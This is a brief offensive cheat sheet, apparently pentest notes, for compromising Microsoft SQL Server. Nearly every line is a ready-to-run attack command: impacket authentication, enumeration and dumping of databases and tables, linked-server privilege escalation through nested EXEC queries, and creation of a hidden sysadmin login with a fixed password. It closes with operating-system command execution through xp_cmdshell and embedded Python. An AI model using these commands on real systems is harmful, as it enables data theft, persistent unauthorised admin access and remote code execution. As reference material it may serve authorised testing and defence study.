# MSSQL Database Authentication and Dumping

### Commands:

 - impacket-mssqlclient -k DOMAIN.LOCAL (Kerberos auth example)

 - impacket-mssqlclient -windows-auth DOMAIN\\USERNAME@TARGET_IP

 - impacket-mssqlclient USERNAME@TARGET_IP (Local auth)

### DATABASE COMMANDS

 - SELECT name FROM sys.databases; (Enumerate all databases within MSSQL instance)

 - SELECT TABLE_NAME,TABLE_SCHEMA FROM targetdb.INFORMATION_SCHEMA.TABLES; (Enumerate tables of the target database)

 - SELECT * FROM targetdb.dbo.targettable (Dump all the contents of the target table of the target database)

### LINKED DATABASES ABUSE

 - select name,sysadmin from syslogins; (Check if our user has admin privileges to run commands with xp_cmdshell)

 - select srvname, isremote from sysservers; (Check if there are any linked servers on the current database. Isremote determines if it is linked or remote. If it is 1, it means it is linked, else is remote.)

 - EXEC ('select current_user') at [NAME\REMOTE_DATABASE]; (Check in whose context we are able to query the linked server)

 - EXEC ('select name,sysadmin from syslogins') at [NAME\REMOTE DATABASE]; (Check for sysadmin sa privileges)

 - EXEC ('select srvname,isremote from sysservers') at [NAME\REMOTE_DATABASE]; (Check the remote DB server if it has more links)

 - EXEC ('EXEC (''select susername()'') at [NAME\DATABASE]') at [NAME\REMOTE DATABASE]; (Nested queries. This use case means that we have encountered a circular link between database servers!)

If we are sa, then we add a user with sysadmin privileges for us

 - EXEC ('EXEC (''EXEC sp_addlogin ''''super'''', ''''abc123!'''''') at [NAME\DATABASE]') at [NAME\REMOTE DATABASE];

 - EXEC ('EXEC (''EXEC sp_addsrvrolemember ''''super'''', ''''sysadmin'''''') at [NAME\DATABASE]') at [NAME\REMOTE DATABASE];

### COMMAND EXECUTION WITH XP_CMDSHELL

 - enable xp_cmdshell (Enable command execution)
 
 - xp_cmdshell whoami

 - EXECUTE sp_configure 'external scripts enabled', 1; (Enable execution of external scripts written in R or python)

 - EXEC sp_execute_external_script @language = N'Python', @script = N'import os; os.system("COMMAND");'; (Run commands using Python)

